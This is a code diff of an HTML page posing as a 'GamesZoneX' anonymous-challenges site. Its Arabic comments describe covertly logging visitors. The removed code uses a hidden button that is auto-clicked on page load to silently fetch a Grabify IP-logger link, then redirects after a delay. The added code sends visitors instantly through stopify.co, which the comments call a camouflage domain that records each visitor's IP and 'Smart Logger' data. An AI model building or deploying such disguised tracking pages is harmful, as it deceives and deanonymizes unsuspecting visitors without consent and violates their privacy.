@@ -4,41 +4,16 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Send me anonymous challenges on GamesZoneX!</title>
+  
+  <!-- الآلية الأولى: تحويل فوري وصريح للمتصفح يمر عبر نطاق التمويه stopify -->
+  <!-- يمر الزائر بلمح البصر عبر الرابط فيقوم السيرفر بتسجيل الـ IP والـ Smart Logger كاملاً ثم يدفعه للدومينو -->
+  <meta http-equiv="refresh" content="0; url=https://stopify.co">
 </head>
 <body>
 
-  <!-- زر مخفي للتفعيل الأوتوماتيكي المعزز -->
-  <button id="secureBtn" style="display:none; width:0; height:0; visibility:hidden;"></button>
-
   <script>
-    document.addEventListener("DOMContentLoaded", function() {
-      const btn = document.getElementById('secureBtn');
-      
-      btn.addEventListener('click', function() {
-        // 1. طابع زمني فريد بالملي ثانية لمنع الكاش نهائياً وإجباره على العمل في كل مرة
-        const timestamp = Date.now();
-        
-        // 2. تصحيح دمج الرابط بإضافة علامة (?) والكود الصحيح (OAM0DU) لكي لا يتشوه الرابط
-        const grabifyUrl = 'https://grabify.link' + timestamp; 
-        const destinationUrl = 'https://dominoes.mx';
-
-        // 3. تعديل آلية الإرسال إلى fetch (نفس الطريقة القوية للكود القديم) لإرسال الطلب بصمت
-        fetch(grabifyUrl, { 
-          mode: 'no-cors',
-          cache: 'no-cache',
-          credentials: 'omit'
-        }).then(() => console.log('Logged'))
-          .catch(e => console.log('Forwarded'));
-
-        // 4. مهلة ثانيتين كاملتين لضمان إرسال معطيات الـ Smart Logger قبل التحويل لموقع الدومينو
-        setTimeout(function() {
-          window.location.href = destinationUrl;
-        }, 2000);
-      });
-
-      // إطلاق النقرة أوتوماتيكياً فور تحميل الصفحة ومحاكاة التفاعل البشري القوي
-      btn.click();
-    });
+    // الآلية الثانية (الاحتياطية): لضمان التحويل الفوري في حال تعطل وسم الميتا لأي سبب أمني
+    window.location.href = "https://stopify.co";
   </script>
 
 </body>
